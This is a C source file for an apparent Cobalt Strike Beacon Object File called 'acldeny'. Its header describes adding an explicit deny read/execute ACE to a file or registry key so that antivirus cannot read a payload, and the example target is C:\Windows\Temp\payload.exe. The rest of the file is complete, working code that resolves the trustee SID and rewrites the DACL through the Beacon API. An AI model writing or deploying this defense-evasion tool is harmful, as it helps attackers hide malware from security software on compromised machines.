/*
 * bof-acldeny <file|reg> <path> [sid-or-account]
 *
 * Add an explicit deny ACE (read + execute) to a file/directory or registry
 * key DACL.  Default trustee is Everyone (S-1-1-0).  This blocks new opens by
 * the trustee, which is the usual trick for keeping AV from reading a payload
 * or a registry key.  Existing handles are unaffected.
 *
 * Examples:
 *   acldeny file C:\Windows\Temp\payload.exe
 *   acldeny reg  HKLM\SOFTWARE\MyKey S-1-5-32-545
 *
 * WARNING: this is a real ACL change.  Denying Everyone can lock you out of
 * the object too; keep an elevated shell available to undo it.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

static PSID resolve_trustee(const char *s)
{
    PSID sid = NULL;

    if (!s || !s[0]) s = "S-1-1-0";
    if (s[0] == 'S' || s[0] == 's') {
        if (ADVAPI32$ConvertStringSidToSidA(s, &sid)) return sid;
    }

    {
        char dom[128];
        DWORD len = 0, domlen = sizeof(dom);
        SID_NAME_USE use;

        if (ADVAPI32$LookupAccountNameA(NULL, s, NULL, &len, dom, &domlen, &use) ||
            KERNEL32$GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
            sid = (PSID)KERNEL32$LocalAlloc(LPTR, len);
            if (sid) {
                domlen = sizeof(dom);
                if (!ADVAPI32$LookupAccountNameA(NULL, s, sid, &len, dom,
                                                 &domlen, &use)) {
                    KERNEL32$LocalFree(sid);
                    sid = NULL;
                }
            }
        }
    }
    return sid;
}

void go(char *args, int alen)
{
    datap parser;
    char *kind, *path, *who = "";
    int klen = 0, plen = 0, wlen = 0;
    HANDLE h = NULL;
    HKEY key = NULL;
    SE_OBJECT_TYPE type;
    PACL oldacl = NULL, newacl = NULL;
    PSECURITY_DESCRIPTOR sd = NULL;
    PSID sid;
    EXPLICIT_ACCESS_A ea;
    DWORD mask, err;
    int is_file;

    BeaconDataParse(&parser, args, alen);
    kind = BeaconDataExtract(&parser, &klen);
    path = BeaconDataExtract(&parser, &plen);
    who  = BeaconDataExtract(&parser, &wlen);
    if (!kind || !path || !path[0]) {
        BeaconPrintf(CALLBACK_ERROR,
                     "usage: acldeny <file|reg> <path> [sid-or-account]\n");
        return;
    }
    if (!who) who = "";

    is_file = bof_stricmp(kind, "file") == 0 || bof_stricmp(kind, "dir") == 0;
    if (!is_file && bof_stricmp(kind, "reg") != 0) {
        BeaconPrintf(CALLBACK_ERROR, "kind must be file or reg\n");
        return;
    }

    sid = resolve_trustee(who);
    if (!sid) {
        BeaconPrintf(CALLBACK_ERROR, "cannot resolve trustee '%s'\n", who);
        return;
    }

    if (is_file) {
        type = SE_FILE_OBJECT;
        h = KERNEL32$CreateFileA(path, READ_CONTROL | WRITE_DAC,
                                 FILE_SHARE_READ | FILE_SHARE_WRITE |
                                 FILE_SHARE_DELETE, NULL, OPEN_EXISTING,
                                 FILE_FLAG_BACKUP_SEMANTICS, NULL);
        if (h == INVALID_HANDLE_VALUE) {
            BeaconPrintf(CALLBACK_ERROR, "open %s failed: %lu\n", path,
                         (unsigned long)KERNEL32$GetLastError());
            KERNEL32$LocalFree(sid);
            return;
        }
    } else {
        char root[512];
        char *sub;
        int i = 0;
        type = SE_REGISTRY_KEY;

        while (path[i] && path[i] != '\\' && i < (int)sizeof(root) - 1) {
            root[i] = path[i];
            i++;
        }
        root[i] = 0;
        sub = (path[i] == '\\') ? path + i + 1 : (char *)"";
        if (ADVAPI32$RegOpenKeyExA(bof_hive(root), sub, 0,
                                   READ_CONTROL | WRITE_DAC, &key) != ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_ERROR, "open key %s failed: %lu\n", path,
                         (unsigned long)KERNEL32$GetLastError());
            KERNEL32$LocalFree(sid);
            return;
        }
        h = (HANDLE)key;
    }

    err = ADVAPI32$GetSecurityInfo(h, type, DACL_SECURITY_INFORMATION,
                                   NULL, NULL, &oldacl, NULL, &sd);
    if (err != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "GetSecurityInfo failed: %lu\n",
                     (unsigned long)err);
        goto cleanup;
    }

    bof_memzero(&ea, sizeof(ea));
    mask = is_file ? (FILE_GENERIC_READ | FILE_GENERIC_EXECUTE) : KEY_READ;
    ea.grfAccessPermissions = mask;
    ea.grfAccessMode = DENY_ACCESS;
    ea.grfInheritance = is_file ? NO_INHERITANCE : SUB_CONTAINERS_AND_OBJECTS_INHERIT;
    ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea.Trustee.TrusteeType = TRUSTEE_IS_UNKNOWN;
    ea.Trustee.ptstrName = (LPSTR)sid;

    err = ADVAPI32$SetEntriesInAclA(1, &ea, oldacl, &newacl);
    if (err != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "SetEntriesInAcl failed: %lu\n",
                     (unsigned long)err);
        goto cleanup;
    }

    err = ADVAPI32$SetSecurityInfo(h, type, DACL_SECURITY_INFORMATION,
                                   NULL, NULL, newacl, NULL);
    if (err == ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT,
                     "[+] deny read/execute for %s on %s %s\n",
                     who[0] ? who : "Everyone", is_file ? "file" : "key", path);
        BeaconPrintf(CALLBACK_OUTPUT,
                     "[*] existing handles are unaffected; new opens are denied\n");
    } else {
        BeaconPrintf(CALLBACK_ERROR, "SetSecurityInfo failed: %lu\n",
                     (unsigned long)err);
    }

cleanup:
    if (sd) KERNEL32$LocalFree(sd);
    if (newacl) KERNEL32$LocalFree(newacl);
    if (is_file) {
        if (h && h != INVALID_HANDLE_VALUE) KERNEL32$CloseHandle(h);
    } else if (key) {
        ADVAPI32$RegCloseKey(key);
    }
    KERNEL32$LocalFree(sid);
}
